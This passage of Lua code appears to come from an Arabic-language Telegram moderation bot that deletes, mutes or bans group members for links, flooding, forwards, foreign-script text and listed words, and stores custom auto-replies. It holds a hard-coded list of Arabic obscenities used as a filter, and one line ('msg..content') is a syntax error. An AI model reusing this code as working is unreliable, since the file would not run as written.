if redis:sismember(bot_id..":Groups",msg.chat_id) then
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") then
if msg.forward_info then
if redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:forward_info") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙ممنوع ترسل توجيهات*").helo,"md",true)  
end
end
if msg.content.luatele == "messageContact"  then
if redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if msg.content.luatele == "messageChatAddMembers" then
Info_User = bot.getUser(msg.content.member_user_ids[1]) 
redis:set(bot_id..":"..msg.chat_id..":"..msg.content.member_user_ids[1]..":AddedMe",msg.sender.user_id)
redis:incr(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Addedmem")
if Info_User.type.luatele == "userTypeBot" or Info_User.type.luatele == "userTypeRegular" then
if redis:get(bot_id..":"..msg.chat_id..":settings:AddMempar") then 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(msg.chat_id,msg.content.member_user_ids[1],'restricted',{1,0,0,0,0,0,0,0,0})
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.content.member_user_ids[1]) 
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
bot.setChatMemberStatus(msg.chat_id,msg.content.member_user_ids[1],'banned',0)
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
end
end
if redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) then
if Info_User.type.luatele == "userTypeBot" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.content.member_user_ids[1]) 
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(msg.chat_id,msg.content.member_user_ids[1],'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
bot.setChatMemberStatus(msg.chat_id,msg.content.member_user_ids[1],'banned',0)
end
end
end
end
if not Vips(msg) then
if redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") then
if msg.content.luatele ~= "messageChatAddMembers"  then 
local floods = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") or "nil"
local Num_Msg_Max = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"floodtime") or 5
local post_count = tonumber(redis:get(bot_id.."Spam:Cont"..msg.sender.user_id..":"..msg.chat_id) or 0)
if post_count >= tonumber(redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"floodtime") or 5) then 
if redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") == "kick" then 
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• قام بالتكرار في المجموعة وتم حظره*").yu,"md",true)
elseif redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") == "del" then 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• قام بالتكرار في المجموعة وتم تقييده*").yu,"md",true)
elseif redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"Spam:User") == "ktm" then
redis:sadd(bot_id.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• قام بالتكرار في المجموعة وتم كتمه*").yu,"md",true)  
end
end
redis:setex(bot_id.."Spam:Cont"..msg.sender.user_id..":"..msg.chat_id, tonumber(5), post_count+1) 
Num_Msg_Max = 5
if redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"floodtime") then
Num_Msg_Max = redis:hget(bot_id.."Spam:Group:User"..msg.chat_id,"floodtime") 
end
end
end
if msg.content.text then
local _nl, ctrl_ = string.gsub(text, "%c", "")  
local _nl, real_ = string.gsub(text, "%d", "")   
sens = 400
if string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then   
if redis:get(bot_id..":"..msg.chat_id..":settings:Spam") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Spam") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Spam") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Spam") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
end
if msg.content.luatele then
if redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:"..msg.content.luatele) == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if redis:get(bot_id..":"..msg.chat_id..":settings:messagePinMessage") then
UnPin = bot.unpinChatMessage(msg.chat_id)
if UnPin.luatele == "ok" then
bot.sendText(msg.chat_id,msg.id,"*• التثبيت معطل من قبل المدراء*","md",true)
end
end
if text and text:match("[a-zA-Z]") and not text:match("@[%a%d_]+") then
if redis:get(bot_id..":"..msg.chat_id..":settings:WordsEnglish") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsEnglish") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsEnglish") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsEnglish") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end 
end
if (text and text:match("ی") or text and text:match('چ') or text and text:match('گ') or text and text:match('ک') or text and text:match('پ') or text and text:match('ژ') or text and text:match('ٔ') or text and text:match('۴') or text and text:match('۵') or text and text:match('۶') )then
if redis:get(bot_id..":"..msg.chat_id..":settings:WordsPersian") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsPersian") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsPersian") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsPersian") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end 
end
if msg.content.text then
list = {"كس","كس اختك","نيچ","كس ام","كس اخت","عير","قواد","كس امك","طيز","مصه","فروخ","تنح","مناوي","طوبز","عيور","ديس","نيج","دحب","نيك","فرخ","نيق","كواد","كسك","كحب","كواد","زبك","عيري","كسي","كسختك","كسمك","زبي"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
if redis:get(bot_id..":"..msg.chat_id..":settings:WordsFshar") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsFshar") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsFshar") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:WordsFshar") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end 
end
end
if redis:get(bot_id..":"..msg.chat_id..":settings:message") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:message") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:message") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:message") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
if msg.via_bot_user_id ~= 0 then
if redis:get(bot_id..":"..msg.chat_id..":settings:via_bot_user_id") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:via_bot_user_id") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:via_bot_user_id") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:via_bot_user_id") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if msg.reply_markup and msg.reply_markup.luatele == "replyMarkupInlineKeyboard" then
if redis:get(bot_id..":"..msg.chat_id..":settings:Keyboard") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Keyboard") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Keyboard") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Keyboard") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if msg.content.entities and msg..content.entities[0] and msg.content.entities[0].type.luatele == "textEntityTypeUrl" then
if redis:get(bot_id..":"..msg.chat_id..":settings:Markdaun") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Markdaun") == "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Markdaun") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Markdaun") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if text and text:match("/[%a%d_]+") then 
if redis:get(bot_id..":"..msg.chat_id..":settings:Cmd")== "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Cmd")== "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Cmd")== "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Cmd")== "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if text and text:match("@[%a%d_]+") then 
if redis:get(bot_id..":"..msg.chat_id..":settings:Username")== "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Username")== "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Username")== "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Username")== "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if text and text:match("#[%a%d_]+") then 
if redis:get(bot_id..":"..msg.chat_id..":settings:Hashtak")== "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Hashtak")== "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Hashtak")== "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Hashtak")== "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
if (text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match("[Tt].[Mm][Ee]/") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]")) or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match(".[Tt][Kk]") or text and text:match(".[Mm][Ll]") or text and text:match(".[Oo][Rr][Gg]") then 
if redis:get(bot_id..":"..msg.chat_id..":settings:Links")== "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Links")== "ked" then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Links") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Links")== "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
----------------------------------------------------------------------------------------------------
end


----------------------------------------------------------------------------------------------------
if Owner(msg) then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":mn:set") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":mn:set")
if text or msg.content.sticker or msg.content.animation or msg.content.photo then
if msg.content.text then   
if redis:sismember(bot_id.."mn:content:Text"..msg.chat_id,text) then
bot.sendText(msg.chat_id,msg.id,"*• تم منع الكلمه سابقاً*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Text"..msg.chat_id, text)  
ty = "الرساله"
elseif msg.content.sticker then   
if redis:sismember(bot_id.."mn:content:Sticker"..msg.chat_id,msg.content.sticker.sticker.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*• تم منع الملصق سابقاً*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Sticker"..msg.chat_id, msg.content.sticker.sticker.remote.unique_id)  
ty = "الملصق"
elseif msg.content.animation then
if redis:sismember(bot_id.."mn:content:Animation"..msg.chat_id,msg.content.animation.animation.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*• تم منع المتحركه سابقاً*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Animation"..msg.chat_id, msg.content.animation.animation.remote.unique_id)  
ty = "المتحركه"
elseif msg.content.photo then
if redis:sismember(bot_id.."mn:content:Photo"..msg.chat_id,msg.content.photo.sizes[1].photo.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*• تم منع الصوره سابقاً*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Photo"..msg.chat_id,msg.content.photo.sizes[1].photo.remote.unique_id)  
ty = "الصوره"
end
bot.sendText(msg.chat_id,msg.id,"*• تم منع "..ty.." *","md",true)  
return false
end
end
----------------------------------------------------------------------------------------------------
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set") == "true1" then
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
test = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:Text:rd")
if msg.content.video_note then
redis:set(bot_id.."Rp:content:Video_note"..msg.chat_id..":"..test, msg.content.video_note.video.remote.id)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
redis:set(bot_id.."Rp:content:Photo"..msg.chat_id..":"..test, idPhoto)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.sticker then 
redis:set(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..test, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then 
redis:set(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..test, msg.content.voice_note.voice.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.video then 
redis:set(bot_id.."Rp:content:Video"..msg.chat_id..":"..test, msg.content.video.video.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:content:Video:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.animation then 
redis:set(bot_id.."Rp:content:Animation"..msg.chat_id..":"..test, msg.content.animation.animation.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:content:Animation:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.document then
redis:set(bot_id.."Rp:Manager:File"..msg.chat_id..":"..test, msg.content.document.document.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.audio then
redis:set(bot_id.."Rp:content:Audio"..msg.chat_id..":"..test, msg.content.audio.audio.remote.id)  
if msg.content.caption.text and msg.content.caption.text ~= "" then
redis:set(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..test, msg.content.caption.text)  
end
elseif msg.content.text then
text = text:gsub('"',"")
text = text:gsub('"',"")
text = text:gsub("`","")
text = text:gsub("*","") 
redis:set(bot_id.."Rp:content:Text"..msg.chat_id..":"..test, text)  
end 
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:set")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:Text:rd")
bot.sendText(msg.chat_id,msg.id,"*• تم حفظ الرد *","md",true)  
return false
end
end
end
---------------------------------------------------------------------------------------------------
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:setg") == "true1" then
if text then
test = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:Text:rdg")
if msg.content.text then
text = text:gsub('"',"")
text = text:gsub('"',"")
text = text:gsub("`","")
text = text:gsub("*","") 
redis:set(bot_id.."Rp:content:Textg"..msg.chat_id..":"..test, text)  
end 
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:setg")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Rp:Text:rdg")
local ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
menseb = ballancee - 10000000
redis:set(bot_id.."boob"..msg.sender.user_id , math.floor(menseb))
local ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
local convert_mony = string.format("%.0f",ballancee)
numcaree = math.random(000000000001,999999999999);
redis:set(bot_id.."rddd"..msg.sender.user_id,numcaree)
bot.sendText(msg.chat_id,msg.id,"\n↯︙⌯ اشعار دفع :\n\nالمنتج : ضع رد \nالسعر : 10000000 دينار\nرصيدك الان : "..convert_mony.." دينار 💵\nرقم الوصل : `"..numcaree.."`\n\nاحتفظ برقم الايصال لاسترداد المبلغ\n","md",true)  
return false
end
end
----------------------------------------------------------------------------------------------------
if text and not redis:get(bot_id.."Zepra:Set:On"..msg.sender.user_id..":"..msg.chat_id) then
local anemi = redis:get(bot_id.."Zepra:Add:Rd:Sudo:Gif"..text)   
local veico = redis:get(bot_id.."Zepra:Add:Rd:Sudo:vico"..text)   
local stekr = redis:get(bot_id.."Zepra:Add:Rd:Sudo:stekr"..text)     
local Text = redis:get(bot_id.."Zepra:Add:Rd:Sudo:Text"..text)   
local photo = redis:get(bot_id.."Zepra:Add:Rd:Sudo:Photo"..text)
local video = redis:get(bot_id.."Zepra:Add:Rd:Sudo:Video"..text)
local document = redis:get(bot_id.."Zepra:Add:Rd:Sudo:File"..text)
local audio = redis:get(bot_id.."Zepra:Add:Rd:Sudo:Audio"..text)
local video_note = redis:get(bot_id.."Zepra:Add:Rd:Sudo:video_note"..text)
if Text then 
local UserInfo = bot.getUser(msg.sender.user_id)
local NumMsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
  local TotalMsg = Total_message(NumMsg) 
  local Status_Gps = Get_Rank(msg.sender.user_id,msg.chat_id)
  local NumMessageEdit = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0
  local Text = Text:gsub('#username',(UserInfo.username or 'لا يوجد')) 
  local Text = Text:gsub('#name',UserInfo.first_name)
  local Text = Text:gsub('#id',msg.sender.user_id)
  local Text = Text:gsub('#edit',NumMessageEdit)
  local Text = Text:gsub('#msgs',NumMsg)
  local Text = Text:gsub('#stast',Status_Gps)
if Text:match("]") then
bot.sendText(msg.chat_id,msg.id,""..Text.."","md",true)  
else
bot.sendText(msg.chat_id,msg.id,"["..Text.."]","md",true)  
end
end
if video_note then
bot.sendVideoNote(msg.chat_id, msg.id, video_note)
end
if photo then
bot.sendPhoto(msg.chat_id, msg.id, photo,'')
end  
if stekr then 
bot.sendSticker(msg.chat_id, msg.id, stekr)
end
if veico then 
bot.sendVoiceNote(msg.chat_id, msg.id, veico, '', 'md')
end
if video then 
bot.sendVideo(msg.chat_id, msg.id, video, '', "md")
end
if anemi then 
bot.sendAnimation(msg.chat_id,msg.id, anemi, '', 'md')
end
if document then
bot.sendDocument(msg.chat_id, msg.id, document, '', 'md')
end  
if audio then
bot.sendAudio(msg.chat_id, msg.id, audio, '', "md") 
end
end

if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
local test = redis:get(bot_id.."Zepra:Text:Sudo:Bot"..msg.sender.user_id..":"..msg.chat_id)
if redis:get(bot_id.."Zepra:Set:Rd"..msg.sender.user_id..":"..msg.chat_id) == "true1" then
redis:del(bot_id.."Zepra:Set:Rd"..msg.sender.user_id..":"..msg.chat_id)
if msg.content.sticker then   
redis:set(bot_id.."Zepra:Add:Rd:Sudo:stekr"..test, msg.content.sticker.sticker.remote.id)  
end   
if msg.content.voice_note then  
redis:set(bot_id.."Zepra:Add:Rd:Sudo:vico"..test, msg.content.voice_note.voice.remote.id)  
end   
if msg.content.animation then   
redis:set(bot_id.."Zepra:Add:Rd:Sudo:Gif"..test, msg.content.animation.animation.remote.id)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."Zepra:Add:Rd:Sudo:Text"..test, text)  
end  
if msg.content.audio then
redis:set(bot_id.."Zepra:Add:Rd:Sudo:Audio"..test, msg.content.audio.audio.remote.id)  
end
if msg.content.document then
redis:set(bot_id.."Zepra:Add:Rd:Sudo:File"..test, msg.content.document.document.remote.id)  
end
if msg.content.video then
redis:set(bot_id.."Zepra:Add:Rd:Sudo:Video"..test, msg.content.video.video.remote.id)  
end
if msg.content.video_note then
redis:set(bot_id.."Zepra:Add:Rd:Sudo:video_note"..test..msg.chat_id, msg.content.video_note.video.remote.id)  
end
if msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
